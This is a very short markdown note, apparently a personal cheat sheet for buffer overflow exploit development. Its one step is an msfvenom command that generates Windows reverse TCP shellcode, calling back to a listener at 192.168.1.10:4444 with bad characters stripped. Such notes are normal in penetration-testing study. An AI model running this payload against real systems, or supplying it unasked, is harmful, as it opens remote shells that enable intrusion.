# Bufferoverflow sequence/process





### Generating Shell code using msfvenom & removing bar chars

```
msfvenom --payload windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 --bad-chars '\x00\x0a' -f C
```
